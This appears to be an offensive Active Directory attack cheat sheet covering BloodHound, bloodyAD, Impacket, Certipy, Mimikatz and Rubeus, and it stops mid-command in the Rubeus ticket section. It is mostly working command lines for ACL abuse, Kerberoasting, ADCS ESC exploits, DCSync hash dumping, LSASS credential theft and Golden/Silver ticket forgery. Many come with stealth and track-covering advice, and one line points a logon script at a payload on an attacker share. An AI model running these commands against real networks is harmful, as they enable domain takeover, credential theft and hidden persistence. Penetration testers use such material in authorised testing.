01BloodHound Collection (bloodhound.py)▶

BloodHound ingests the raw relationships of the domain (group membership, ACLs, sessions, trusts, delegation) and lets you query attack paths as a graph. bloodhound.py is the Python collector — it runs from Linux with just domain credentials and talks LDAP + SMB to the DC, so you never need to run anything on a Windows host.

Any valid domain account (password, NT hash, or Kerberos ticket) and network access to the DC on 389/LDAP + 445/SMB.

Standard collection

Why -c All: pulls every collection method in one run (objects, ACLs, sessions, trusts). Good first pass; noisier because it queries session data on member hosts.

# Standard — collect everything
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All

Targeted collection methods

Why narrow it: DCOnly reads everything from the DC's LDAP only — no touching member workstations — so it is fast and quiet and still gives you ACLs, group membership and trusts (just not live sessions). Use it when you want paths without lighting up host logs.

# Specific collection methods (faster / less noise)
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c DCOnly              # DC objects only — fast, low noise
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c Session,Trusts      # sessions + trust relationships

Authenticating without a password

Why these exist: once you own a hash or a ticket you rarely have the plaintext. --hashes authenticates with the NT hash (pass-the-hash over LDAP); the Kerberos path uses a cached TGT so no secret touches the wire at all — the quietest option.

# NTLM hash instead of password
python3 bloodhound.py -d DOMAIN.LOCAL -u username \
  --hashes :NTLMHASH -ns <DC_IP> -c All

# Kerberos ticket (CCACHE) — no password on the wire
export KRB5CCNAME=/path/to/ticket.ccache
python3 bloodhound.py -d DOMAIN.LOCAL -u username -k --no-pass \
  -ns <DC_IP> -c All

DC hostname + output

Why --dc: when reverse DNS is broken the collector can't resolve the DC from the IP alone — naming it explicitly avoids that. --zip bundles the JSON ready for the GUI import.

# Specify DC hostname explicitly
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  --dc DC01.DOMAIN.LOCAL -ns <DC_IP> -c All

# Custom output directory + auto-zip for BloodHound import
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All -o ./bh_out/ --zip
Load the resulting JSON/zip files into the BloodHound GUI: Database → Upload Data. Use the "Shortest Paths to Domain Admins" pre-built query as a starting point.
02BloodHound — Common Errors & Fixes▶

Nearly every collection failure is DNS, clock skew, or the wrong auth protocol. AD is DNS-driven and Kerberos is time-sensitive, so the collector has to resolve names through the DC and stay within five minutes of its clock.

DNS resolution failure

Why it happens: your resolver doesn't know the AD zone. The collector must resolve the domain and DC names, which only the DC's DNS server answers — so point name resolution at the DC.

# Symptom: "Could not find domain controller", "NXDOMAIN", "Name or service not known"
# Fix: always pass -ns pointing at the DC
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All

# Or add the DC to /etc/resolv.conf temporarily
echo "nameserver <DC_IP>" | sudo tee -a /etc/resolv.conf

Clock skew (KRB_AP_ERR_SKEW)

Why it happens: Kerberos timestamps authenticators to stop replay. If your clock drifts more than ~5 minutes from the DC, every ticket is rejected. Sync to the DC and the error clears.

# Symptom: Kerberos auth fails with clock skew error
sudo ntpdate <DC_IP>           # sync clock to DC
sudo timedatectl set-ntp false
sudo date -s "$(net time -S <DC_IP>)"   # or use net time

LDAP query failures / hangs

Why these flags help: default auth may try Kerberos and stall — --auth-method ntlm forces the simpler bind. --dns-tcp is for environments that block UDP/53 (DNS over TCP still works).

# Symptom: collection hangs or returns 0 objects
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All --auth-method ntlm    # force NTLM (default may try Kerberos)

python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All --dns-tcp             # use TCP for DNS (firewalled UDP)

Port 389 refused → try LDAPS

Why: some DCs require signing/channel-binding and only accept TLS. 636/LDAPS satisfies that where plaintext 389 is refused.

# LDAP may be blocked — try LDAPS (636)
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All -p 636 --secure       # TLS / LDAPS

Bad credentials / empty output

Why verify first: confirm the creds with a cheap SMB check before anything else, and watch the lockout policy — a looping collector can lock the account. --disable-pooling -w 1 forces single-threaded collection when concurrency corrupts results.

# Verify creds first:
crackmapexec smb <DC_IP> -u username -p 'Password123'
# Check for account lockout policy before brute-forcing

# Symptom: files created but few/no objects collected
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All --disable-pooling -w 1   # single-threaded, no pool
03bloodyAD.py — ACL Object Manipulation▶

bloodyAD turns an ACL edge BloodHound found (GenericWrite, GenericAll, WriteDACL…) into an actual change on the object. Each command below is the concrete abuse of one specific right — the right you hold decides which command you can run.

All commands assume -d DOMAIN.LOCAL -u USER -p 'PASS' --host DC_IP. Swap -p 'PASS' for --hashes :NTLMHASH or -k (Kerberos with KRB5CCNAME set).

# SYNTAX:  python3 bloodyAD.py -d DOMAIN.LOCAL -u USER -p 'PASS' --host DC_IP
# Also accepts: --hashes LMHASH:NTLMHASH   or   -k (Kerberos w/ KRB5CCNAME)

Read attributes (get)

Why first: confirm what an object actually has before abusing it — current SPNs, group membership, and the RBCD attribute tell you which path is open.

python3 bloodyAD.py [...] get object TARGET_USER \
  --attr memberOf,servicePrincipalName,msDS-AllowedToActOnBehalfOfOtherIdentity

python3 bloodyAD.py [...] get object "Domain Admins" --attr member

Reset a password

Why it works: GenericAll or the ForceChangePassword extended right lets you set a new password without knowing the old one. Instant account takeover — but it's destructive (the real user/service breaks), so prefer SPN or shadow-cred abuse when stealth matters.

GenericAll or ForceChangePassword (User-Force-Change-Password) on the target.
python3 bloodyAD.py [...] set password TARGET_USER 'NewPassword123!'

Targeted Kerberoasting (set SPN)

Why it works: writing a servicePrincipalName onto a user makes that account Kerberoastable on demand — you then request its TGS and crack it offline (see §05). Remove the SPN afterwards to clean up.

GenericWrite or GenericAll on the target user.
python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName \
  -v 'MSSQLSvc/fake.domain.local:1433'

# Remove the SPN after attack (cleanup)
python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v ''

Shadow Credentials

Why it works: you append a certificate (KeyCredentialLink) to the target's msDS-KeyCredentialLink, then authenticate with PKINIT as that user. Non-destructive — unlike a password reset the account keeps working, so it's the stealthier takeover.

GenericWrite/GenericAll on the target and a DC with PKINIT (ADCS or the KDC cert) available.
python3 bloodyAD.py [...] set shadowCredentials TARGET_USER
# Then authenticate:  certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP

Add / remove group members

Why it works: write access to a group's member attribute lets you add any principal — add yourself to a privileged group and inherit its rights immediately.

GenericAll, WriteProperty/Self, or AddMember on the group.
python3 bloodyAD.py [...] add groupMember "Domain Admins" TARGET_USER
python3 bloodyAD.py [...] remove groupMember "Domain Admins" TARGET_USER

Grant DCSync

Why it works: writing the domain DACL lets you give an account the replication rights (DS-Replication-Get-Changes + -All) that DCSync needs. That account can then pull every hash in the domain — full compromise — and it's a quiet backdoor because it looks like a normal replication partner.

WriteDACL on the domain object (DC=DOMAIN,DC=LOCAL).
python3 bloodyAD.py [...] add dcsync TARGET_USER

RBCD — Resource-Based Constrained Delegation

Why it works: writing msDS-AllowedToActOnBehalfOfOtherIdentity on a computer tells it to trust a machine account you control to act "on behalf of" any user. You then run S4U2Self+S4U2Proxy (§04) to mint a service ticket as Administrator to that host. This is the standard pivot from GenericWrite on a computer to a shell on it.

GenericWrite/GenericAll on the target computer, plus a machine account you control (MachineAccountQuota > 0 lets you make one).
# Grant ATTACKER_MACHINE$ the right to impersonate users on TARGET_MACHINE$
python3 bloodyAD.py [...] set rbcd TARGET_MACHINE$ ATTACKER_MACHINE$

# Clear RBCD after attack
python3 bloodyAD.py [...] remove rbcd TARGET_MACHINE$ ATTACKER_MACHINE$

UAC flags

Why it works: the userAccountControl bitmask controls account behaviour. Flipping DONT_REQ_PREAUTH makes the account AS-REP roastable (§05) even though it wasn't before — a deliberate weakening you can undo afterwards.

GenericAll (or write to userAccountControl) on the target.
python3 bloodyAD.py [...] set uac TARGET_USER -f ACCOUNTDISABLE      # disable
python3 bloodyAD.py [...] set uac TARGET_USER -f DONT_REQ_PREAUTH    # ASREPRoastable

Logon script (code exec)

Why it works: scriptPath runs at the user's next interactive logon. Point it at a payload on a share you control and you get execution in that user's context — but you have to wait for them to log in.

GenericWrite on the target user.
python3 bloodyAD.py [...] set object TARGET_USER scriptPath \
  -v '\\ATTACKER_IP\share\payload.bat'

Restore a deleted object

Why you'd want it: recover an object you (or a defender) removed, or resurrect a stale privileged account. Needs the AD Recycle Bin feature enabled.

# First find deleted objects (requires Recycle Bin feature enabled)
python3 bloodyAD.py [...] get object \
  "CN=DeletedUser,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL" --attr *

python3 bloodyAD.py [...] restore object \
  "CN=DeletedUser\0ADEL:guid,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL"

Create a machine account

Why it works: by default any authenticated user can join up to 10 computers (ms-DS-MachineAccountQuota = 10). A machine account you own is the controllable principal RBCD and S4U need.

ms-DS-MachineAccountQuota > 0 (default 10).
python3 bloodyAD.py [...] add computer ATTACKER_MACHINE$ 'MachinePass123!'

Generic attribute write

Why it matters: many edges reduce to "write one attribute." Writing altSecurityIdentities, for example, maps a certificate you hold to the victim for explicit cert mapping — another certificate-based takeover.

python3 bloodyAD.py [...] set object TARGET_USER altSecurityIdentities \
  -v 'Kerberos:cn=attacker,cn=users,dc=domain,dc=local'
04Kerberos Ticket Operations▶

In Kerberos you prove identity once to get a TGT, then exchange it for per-service TGS tickets. These Impacket tools let you obtain, convert and reuse those tickets from Linux — the backbone of pass-the-ticket and delegation abuse.

getTGT.py — obtain a TGT

Why three input types: a TGT is granted to anyone who can prove the account's secret. A password, its NT hash (pass-the-hash), or its AES key (pass-the-key) all work — AES is the best OPSEC because modern domains use AES by default and an RC4 request stands out.

# Password
python3 getTGT.py DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP

# NTLM hash (Pass-the-Hash → TGT)
python3 getTGT.py DOMAIN.LOCAL/username -hashes :NTLMHASH -dc-ip DC_IP

# AES key (Pass-the-Key — more OPSEC)
python3 getTGT.py DOMAIN.LOCAL/username -aesKey AES256KEY -dc-ip DC_IP

# Output file name
python3 getTGT.py DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP \
  -o custom_name.ccache

getST.py — request a service ticket (incl. S4U)

Why -impersonate: this is the S4U2Self + S4U2Proxy chain. If your account (usually a machine account) is trusted for delegation to a service, the KDC will hand you a ticket as any user you name for that service — so you request a cifs/ ticket as Administrator and own the target. This is how an RBCD or constrained-delegation edge becomes a shell.

For plain TGS: any valid creds. For -impersonate: the requesting account must be trusted to delegate to the target SPN (RBCD you set, or classic constrained delegation).
# Request a TGS for a specific SPN
python3 getST.py DOMAIN.LOCAL/username:'Password123' \
  -spn MSSQLSvc/server.domain.local -dc-ip DC_IP

# S4U2Self + S4U2Proxy — impersonate Administrator via RBCD / constrained deleg
python3 getST.py DOMAIN.LOCAL/machine$:'MachinePass123!' \
  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP

# With hash
python3 getST.py DOMAIN.LOCAL/machine$ -hashes :MACHINEPASSHASH \
  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP

Using tickets (KRB5CCNAME)

Why it works: Impacket reads the ticket path from the KRB5CCNAME environment variable. Export it once and every tool with -k -no-pass authenticates with that ticket — no secret on the wire, and it survives a password reset.

# Export ticket for all impacket / bloodyAD tools
export KRB5CCNAME=/path/to/username.ccache

# Use with impacket
python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 smbexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL

# Use with crackmapexec
export KRB5CCNAME=admin.ccache
crackmapexec smb TARGET_IP --kerberos -u Administrator -d DOMAIN.LOCAL

# List current tickets
klist

# Destroy all tickets
kdestroy

ticketConverter.py — CCACHE ↔ Kirbi

Why convert: Linux/Impacket uses .ccache; Windows/Rubeus/Mimikatz use .kirbi. Convert when you move a ticket between a Linux foothold and a Windows host.

python3 ticketConverter.py ticket.ccache ticket.kirbi   # → Kirbi for Rubeus
python3 ticketConverter.py ticket.kirbi  ticket.ccache  # → CCACHE for Linux
After exporting KRB5CCNAME, every Impacket tool with -k -no-pass will use the ticket automatically. No password goes on the wire.
05Kerberoasting & AS-REP Roasting▶

Two offline-cracking attacks that need little or no privilege. Both exploit the fact that Kerberos hands out material encrypted with an account's long-term key, which you can crack at your leisure off the wire.

How Kerberoasting works

Why it works: any authenticated user is allowed to request a TGS for any account that has a servicePrincipalName. The TGS is partly encrypted with the service account's own key (its NT hash for RC4/etype 23, or its AES key). You take that encrypted blob offline and brute-force it — a hit reveals the service account's plaintext password. It lands so often because service accounts tend to have old, human-chosen, non-expiring passwords, and because you can force the cheap-to-crack RC4 variant.

Any valid domain account. Targets must have an SPN set (service accounts, or any user you gave one to via §03).

GetUserSPNs.py (Impacket — from Linux)

Why list first: running without -request just enumerates which accounts are roastable, so you pick high-value, crackable targets instead of blindly roasting everything (some orgs plant honeypot SPNs). Add -request to pull the hashes; -request-user targets one account.

# List kerberoastable accounts (no hashes pulled — recon only)
python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:'Password123'

# Request TGS hashes for ALL SPN accounts, save in hashcat format
python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:'Password123' \
  -request -outputfile kerberoast.txt

# Target a single account (quieter — one TGS request)
python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:'Password123' \
  -request-user svc_sql -outputfile svc_sql.txt

# With NT hash or a Kerberos ticket instead of a password
python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username -hashes :NTLMHASH -request
export KRB5CCNAME=user.ccache
python3 GetUserSPNs.py -dc-ip DC_IP -k -no-pass DOMAIN.LOCAL/username -request

# Kerberoast across a trusted domain (needs creds in the current domain)
python3 GetUserSPNs.py -target-domain CHILD.DOMAIN.LOCAL \
  -dc-ip DC_IP DOMAIN.LOCAL/username:'Password123' -request

nxc — one-shot roast over LDAP

Why use it: NetExec does the enumerate-and-request in a single command and writes the hashes straight to a file. Handy when you just want the hashes and already have nxc in hand.

nxc ldap DC_IP -u username -p 'Password123' --kerberoasting kerberoast.txt
nxc ldap DC_IP -u username -H NTLMHASH --kerberoasting kerberoast.txt

Targeted Kerberoasting (no SPN? make one)

Why it works: if you hold GenericWrite/GenericAll over a user that has no SPN, you can write one, roast it, then delete it. Turns an ACL edge into a crackable hash for that specific (often privileged) account.

GenericWrite/GenericAll on the target user (see §03 for the bloodyAD/PowerView set-SPN commands).
# 1. add a fake SPN   2. roast it   3. remove the SPN (cleanup)
python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v 'HTTP/x'
python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:'Password123' \
  -request-user TARGET_USER -outputfile target.txt
python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v ''

Cracking the hashes

Why the mode matters: the etype in the ticket decides the hashcat mode. RC4 (13100) is by far the fastest to crack; AES (19600/19700) is slower, which is one reason attackers try to force RC4.

hashcat -m 13100 kerberoast.txt rockyou.txt      # RC4   (etype 23) — fastest
hashcat -m 19600 kerberoast.txt rockyou.txt      # AES128 (etype 17)
hashcat -m 19700 kerberoast.txt rockyou.txt      # AES256 (etype 18)

# John equivalent
john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt

AS-REP Roasting

Why it works: accounts with "Do not require Kerberos pre-authentication" (DONT_REQ_PREAUTH) will hand out an AS-REP to anyone who asks — no password needed. Part of that reply is encrypted with the user's key, so you crack it offline exactly like a Kerberoast hash. You don't even need valid creds, just a list of usernames to try.

Target accounts have pre-auth disabled. A username list (no creds required for the roast itself).
# Impacket — pull AS-REP for pre-auth-disabled users
python3 GetNPUsers.py -dc-ip DC_IP DOMAIN.LOCAL/ -usersfile users.txt \
  -format hashcat -outputfile asrep.txt -no-pass

# With valid creds, let the DC enumerate the flagged accounts for you
python3 GetNPUsers.py -dc-ip DC_IP DOMAIN.LOCAL/username:'Password123' -request

# nxc equivalent
nxc ldap DC_IP -u username -p 'Password123' --asreproast asrep.txt

# Crack (etype 23 AS-REP)
hashcat -m 18200 asrep.txt rockyou.txt
Every TGS request logs Event ID 4769 on the DC and AS-REP requests log 4768. Requesting RC4 (etype 23) for an account that supports AES is a classic detection signal — roast selectively, and avoid any account that looks like a honeypot (an SPN on a disabled/never-logged-on account).
For the Windows-side equivalent (Rubeus kerberoast / asreproast, including /tgtdeleg to avoid RC4 downgrade), see §09.
06Certipy — ADCS Attacks▶

AD Certificate Services issues certificates that can be used to authenticate (PKINIT). A misconfigured template or CA lets a low-priv user enrol a certificate as someone else — usually Administrator — and a certificate survives password changes, making it great persistence. Always enumerate first to learn which ESC class applies, then run the matching exploit.

Enumerate (find)

Why -vulnerable -stdout: Certipy classifies every template/CA against the known ESC misconfigurations and prints only the exploitable ones, naming the ESC — that label tells you which command below to run.

Any valid domain account.
certipy find -u username@DOMAIN.LOCAL -p 'Password123' -dc-ip DC_IP

# Show only vulnerable templates to stdout (no output files)
certipy find -u username@DOMAIN.LOCAL -p 'Password123' \
  -dc-ip DC_IP -vulnerable -stdout

# With hash
certipy find -u username@DOMAIN.LOCAL -hashes :NTLMHASH -dc-ip DC_IP -vulnerable

ESC1 — enrollee supplies subject

Why it works: the template lets the requester specify an arbitrary Subject Alternative Name and allows client-authentication EKU. You request a cert but set the SAN/UPN to administrator — the CA issues a cert that authenticates as Administrator.

certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'VulnerableTemplate' \
  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP

ESC2 — Any Purpose / no EKU

Why it works: the cert has no EKU restriction (or "Any Purpose"), so it can be used for client auth among other things — enrol it and reuse it to authenticate.

certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'VulnerableTemplate' -dc-ip DC_IP

ESC3 — Enrollment Agent

Why it works: an Enrollment Agent certificate is allowed to request certs on behalf of other users. Get the agent cert, then use it to enrol a logon cert as Administrator.

# Step 1: obtain enrollment agent cert
certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'EnrollmentAgent' -dc-ip DC_IP

# Step 2: request cert on behalf of Administrator
certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'User' \
  -on-behalf-of 'DOMAIN\Administrator' -pfx enrollment_agent.pfx -dc-ip DC_IP

ESC4 — writable template ACL

Why it works: you hold WriteDacl/WriteOwner over a template, so you rewrite it into an ESC1 config, exploit it, then restore the original to cover your tracks.

WriteDacl/WriteOwner/WriteProperty on the certificate template.
# Save old template config and overwrite to ESC1
certipy template -u username@DOMAIN.LOCAL -p 'Password123' \
  -template 'VulnerableTemplate' -save-old -dc-ip DC_IP

# Then exploit as ESC1, then restore
certipy template -u username@DOMAIN.LOCAL -p 'Password123' \
  -template 'VulnerableTemplate' -configuration old.json -dc-ip DC_IP

ESC6 — CA-wide SAN flag

Why it works: the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, meaning any template honours an attacker-supplied SAN — so you exploit even the stock User template like ESC1.

certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'User' \
  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP

ESC7 — Manage CA / Manage Certificates

Why it works: these CA rights let you add yourself as an officer and enable the SubCA template, then approve your own otherwise-denied request — turning a CA-admin right into a Domain Admin cert.

certipy ca -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -add-officer username -dc-ip DC_IP
certipy ca -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -enable-template 'SubCA' -dc-ip DC_IP

ESC8 — NTLM relay to the CA web endpoint

Why it works: the CA's HTTP enrolment endpoint accepts NTLM auth with no channel binding. Coerce a privileged machine (e.g. a DC via PetitPotam) to authenticate to you, relay that to the CA, and receive a cert as that machine — then DCSync. Pair this with the coercion module in §15.

certipy relay -target http://CA_IP/certsrv/certfnsh.asp -template DomainController

Authenticate with the certificate

Why it's the payoff: certipy auth does PKINIT with the issued .pfx — it returns both a TGT (.ccache) and the account's NT hash in one step. From there you need no password at all.

certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → dumps administrator hash + saves .ccache ticket

# Shadow Credentials via ADCS (auto — requires GenericWrite on target)
certipy shadow auto -u username@DOMAIN.LOCAL -p 'Password123' \
  -account TARGET_USER -dc-ip DC_IP
certipy auth against a vulnerable CA yields both the NTLM hash and a .ccache TGT in one step — no password needed after that point.
07secretsdump.py▶

Impacket's hash-extraction swiss-army knife. Against a DC it performs DCSync (asks the DC to replicate secrets); against a member it reads the SAM/LSA remotely; offline it parses saved hives or NTDS.dit.

Remote DCSync — dump all domain hashes

Why it works: DCSync impersonates a domain controller and calls the replication API (DRSUAPI). The DC streams back password hashes as if syncing to a partner — so a single account with replication rights dumps the whole domain, including krbtgt (which enables Golden Tickets).

An account with DS-Replication-Get-Changes + -All (Domain Admins, or any account you granted via §03).
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP

# With NTLM hash
python3 secretsdump.py DOMAIN.LOCAL/username@DC_IP \
  -hashes LMHASH:NTLMHASH

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL

# Dump only a specific account (quieter)
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP \
  -just-dc-user Administrator

# NTLM hashes only (skip LSA secrets, faster)
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP \
  -just-dc-ntlm

Remote SAM dump — non-DC host

Why: on a member box this pulls the local SAM (local account hashes) and LSA secrets over SMB — useful for local-admin reuse and cached service creds.

Local admin on the target.
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@MACHINE_IP

Offline — from hives / NTDS.dit

Why offline: if you grabbed the registry hives (reg save) or NTDS.dit via VSS/Backup Operators, you decrypt them on your own box — no further contact with the target, so nothing to detect at dump time.

# First on target: reg save HKLM\SAM SAM && reg save HKLM\SYSTEM SYSTEM
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# From NTDS.dit (grabbed via VSS / Backup Operators)
python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Output to file
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP \
  -outputfile domain_hashes
DCSync is heavily monitored — replication from a non-DC source address is a strong detection. Prefer -just-dc-user krbtgt or a single target over a full dump when stealth matters.
08Mimikatz▶

The classic Windows post-exploitation tool: it reads secrets out of LSASS memory and the registry, and forges Kerberos tickets. Run from an elevated prompt. privilege::debug is required before most commands. Use .\mimikatz.exe in PowerShell.

Elevation

Why needed: reading another process's memory needs SeDebugPrivilege; privilege::debug enables it. token::elevate steals a SYSTEM token so you can reach SAM/LSA.

Local administrator (to get SeDebug / SYSTEM).
privilege::debug                        # enable SeDebugPrivilege (required for most)
token::elevate                          # impersonate SYSTEM token

Credential dumping from LSASS

Why it works: LSASS caches credential material for interactive/remote logons so the user isn't re-prompted. Mimikatz parses that memory for NT hashes, Kerberos keys, and (on old/WDigest-enabled hosts) plaintext passwords. Parsing a minidump offline avoids opening a handle to live LSASS on the box — friendlier against EDR.

sekurlsa::logonpasswords                # dump all logged-on creds from LSASS
sekurlsa::wdigest                       # dump WDigest (plaintext on older OS)
sekurlsa::kerberos                      # dump Kerberos tickets from LSASS
sekurlsa::dpapi                         # dump DPAPI master keys from memory

# Parse a dump offline (grab lsass.dmp first — see §10)
sekurlsa::minidump C:\lsass.dmp         # point at dump file (ABSOLUTE path)
sekurlsa::logonpasswords                # parse the dump

Local SAM & LSA secrets

Why useful: lsadump::sam gives local account hashes (local-admin reuse across the fleet); lsadump::secrets often reveals service-account plaintext passwords stored for services to start; cache gives cached domain logons (DCC2) for offline cracking.

lsadump::sam                            # local SAM hashes
lsadump::secrets                        # LSA secrets (service account plaintexts)
lsadump::cache                          # cached domain credentials (DCC2 hashes)

DCSync

Why it works: same replication abuse as secretsdump, but from Windows. /user:krbtgt is the prize — its hash lets you forge Golden Tickets.

Replication rights (Domain Admin or delegated).
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv   # dump everything to CSV

Pass-the-Hash / Overpass-the-Hash

Why it works: NTLM auth only needs the hash, not the plaintext — sekurlsa::pth spawns a process with the hash injected. Supplying an AES key instead ("overpass-the-hash") produces a normal-looking Kerberos logon, far quieter than raw NTLM.

sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
  /ntlm:NTLMHASH /run:cmd.exe           # spawn cmd.exe as that user

# Overpass the Hash (Pass-the-Key — AES for better OPSEC)
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
  /aes256:AES256KEY /run:powershell.exe

Ticket manipulation + Golden/Silver

Why it works: with the krbtgt hash you can forge a TGT for any user with any group membership — a Golden Ticket (full domain, long-lived persistence). A Silver Ticket forges a TGS for one service using that service/computer account's hash — stealthier because it never contacts the DC.

Golden: krbtgt hash + domain SID. Silver: the target service/computer account hash + domain SID.
kerberos::list                          # list all tickets in memory
kerberos::list /export                  # export tickets to .kirbi files
kerberos::purge                         # purge all tickets
kerberos::ptt ticket.kirbi              # pass-the-ticket (import .kirbi)

# Golden Ticket — forge TGT with krbtgt hash (persistence)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_NTLMHASH /id:500

# Silver Ticket — forge TGS for specific service
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:DC01.DOMAIN.LOCAL /service:cifs \
  /rc4:MACHINE_NTLMHASH /id:500
09Rubeus.exe▶

Rubeus is the Windows Kerberos toolkit. All operations are in-process (.NET) — no LSASS handle is opened for most tasks, making it more OPSEC-friendly than Mimikatz for ticket work.

Kerberoasting

Why /tgtdeleg: it requests tickets using your own TGT's session key, letting Rubeus pull roastable hashes without explicitly downgrading to RC4 on AES-only accounts — fewer anomalies than blindly forcing RC4. See §05 for the concept and cracking modes.

A valid Kerberos logon session on the host (any domain user).
Rubeus.exe kerberoast /outfile:hashes.txt                   # all SPNs
Rubeus.exe kerberoast /user:svc_sql /outfile:sql.txt        # specific user
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt         # RC4 downgrade avoidance
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt         # request RC4 explicitly

AS-REP Roasting

Why it works: same as §05 — pre-auth-disabled accounts leak crackable material. /format:hashcat emits the hash ready for mode 18200.

Rubeus.exe asreproast /outfile:asrep.txt                    # all DONT_REQ_PREAUTH
Rubeus.exe asreproast /user:target /outfile:asrep.txt       # specific user
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt    # hashcat format

Request a TGT (asktgt)

Why: mint a usable TGT from a password, hash (overpass-the-hash) or AES key. /nowrap keeps the base64 blob on one line for piping; AES + /opsec mimics a normal logon.

Rubeus.exe asktgt /user:username /password:Password123 \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap

# With NTLM hash (Overpass-the-Hash)
Rubeus.exe asktgt /user:username /rc4:NTLMHASH \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap

# With AES key (better OPSEC)
Rubeus.exe asktgt /user:username /aes256:AES256KEY \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /opsec

Pass-the-Ticket

Why: inject a .kirbi/base64 ticket into your current session so subsequent access uses that identity. triage/dump list and extract tickets already in memory.

Rubeus.exe ptt /ticket:BASE64TICKETBLOB==          # import from base64
Rubeus.exe ptt /ticket:C:\ticket.kirbi             # import from file
Rubeus.exe triage                                  # list all tickets in all sessions
Rubeus.exe dump                                    # dump all tickets
Rubeus.exe dump /user:Administrator /service:krbtgt /nowrap   # specific ticket
Rubeus.exe purge                                   # delete all tickets

S4U — constrained delegation / RBCD

Why it works: the Windows counterpart of getST.py's -impersonate. Using a controlled account trusted for delegation, you run S4U2Self+S4U2Proxy to mint a service ticket as Administrator and /ptt it straight into your session.

The account must be trusted to delegate to the target SPN (RBCD you set, or constrained delegation).
Rubeus.exe s4u /user:machine$ /rc4:MACHINEPASSHASH \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.DOMAIN.LOCAL \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /ptt

# With existing TGT
Rubeus.exe s4u /ticket:machine_tgt.kirbi \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.DOMAIN.LOCAL /ptt

Golden / Silver tickets

Why: same forgery as Mimikatz (§08) but in-process. Golden = krbtgt hash → any identity; Silver = service hash → one service, no DC contact.

Rubeus.exe golden /user:Administrator /id:500 \
